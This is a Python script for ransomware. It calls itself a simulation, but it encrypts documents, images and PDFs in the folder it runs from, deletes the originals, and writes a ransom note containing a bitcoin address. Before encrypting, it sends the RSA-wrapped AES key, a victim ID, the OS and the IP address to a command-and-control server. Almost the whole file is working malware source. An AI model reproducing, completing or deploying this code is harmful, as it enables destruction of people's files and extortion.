import os
import base64
import requests
import socket
import getpass
import platform
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import uuid

# Public key will be inserted by payload_builder
PUBLIC_KEY = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu8YcLFcz2GeRub+MSJa3
TBTdDer75zRQ0JHzKIC+BPAFn4bOpTNg7VH5DdFCCSgo80/YjkyPb7N/vY69FQOn
777673GX4y0HAS+QeeUziaZ5E6rnFKqOtD8/mBQA6IbnEjx0Sw4+swafqbQtt0hH
uh9j48+M68jsrWujYCPdPQRerbImeGZymhiiYl3Sc8EE7sn/9CaTOyx8lcxxuK2f
gSmd1Cf3C6mU0/k0UtGYD372+2OPySIDdJzfRb5Ijp9CMdt1+PtfiXTO8q4/6pdE
g0EzEn5AZWUNe7sM6gTft0xpZNhIIGGqXgx4QxYd6Xf7DvVTObL++KfWQan8o3wZ
VwIDAQAB
-----END PUBLIC KEY-----'''

class SimpleRansomware:
    def __init__(self):
        self.c2_url = f"http://192.168.1.13:5000/register"
        self.victim_id = str(uuid.uuid4())[:8]
        self.aes_key = os.urandom(32)
        self.public_key = self.load_key()
        
    def load_key(self):
        return serialization.load_pem_public_key(
            PUBLIC_KEY.encode(),
            backend=default_backend()
        )
    
    def register_with_c2(self):
        encrypted_key = self.public_key.encrypt(
            self.aes_key,
            padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), 
                        algorithm=hashes.SHA256(), label=None)
        )
        
        data = {
            'id': self.victim_id,
            'os': platform.platform(),
            'ip': socket.gethostbyname(socket.gethostname()),
            'files': 0,
            'key': base64.b64encode(encrypted_key).decode()
        }
        
        try:
            response = requests.post(self.c2_url, json=data, timeout=5)
            if response.status_code == 200:
                print(f"[+] Registered with C2: {self.victim_id}")
                return True
        except Exception as e:
            print(f"[-] C2 offline: {e}")
        
        return False
    
    def encrypt_test_files(self):
        """Encrypt files in current directory for demo"""
        test_files = []
        
        # Look for .txt, .docx, .jpg files
        for f in os.listdir('.'):
            if f.endswith(('.txt', '.docx', '.jpg', '.png', '.pdf')) and not f.startswith('.'):
                test_files.append(f)
        
        if not test_files:
            # Create test files
            for i in range(3):
                filename = f"test_document_{i}.txt"
                with open(filename, 'w') as f:
                    f.write(f"This is test document {i}\n")
                test_files.append(filename)
        
        # Encrypt files
        for filename in test_files:
            try:
                with open(filename, 'rb') as f:
                    data = f.read()
                
                iv = os.urandom(16)
                cipher = Cipher(algorithms.AES(self.aes_key), modes.CFB(iv))
                encryptor = cipher.encryptor()
                encrypted = encryptor.update(data) + encryptor.finalize()
                
                with open(filename + '.locked', 'wb') as f:
                    f.write(iv + encrypted)
                
                os.remove(filename)
                print(f"[+] Encrypted: {filename}")
            except Exception as e:
                print(f"[-] Failed: {filename} - {e}")
        
        return len(test_files)
    
    def create_ransom_note(self):
        note = f"""
        ⚠️ YOUR FILES HAVE BEEN ENCRYPTED ⚠️
        
        To recover your files, contact the attacker via this bitcoin address:
        1FfmbHfnpaZjKFvyi1okTjJJusLhyoNnY
        
        Your Victim ID: {self.victim_id}
        
        Don't try to decrypt files yourself!
        """
        
        with open("READ_ME.txt", "w", encoding="utf-8") as f:
            f.write(note)
        
        print("[+] Ransom note created: READ_ME.txt")
    
    def run(self):
        print("🔒 Starting ransomware simulation...")
        print(f"Victim ID: {self.victim_id}")
        
        # Register with C2
        if not self.register_with_c2():
            print("[!] Warning: Could not contact C2 server")
        
        # Encrypt files
        count = self.encrypt_test_files()
        print(f"[+] Encrypted {count} files")
        
        # Create ransom note
        self.create_ransom_note()
        
        # Clean up key
        self.aes_key = b'0' * 32
        
        print("\n" + "="*50)
        print("Ransomware simulation complete!")
        print(f"Share this ID with attacker: {self.victim_id}")
        print("="*50)
        
        input("\nPress Enter to exit...")

if __name__ == "__main__":
    ransomware = SimpleRansomware()
    ransomware.run()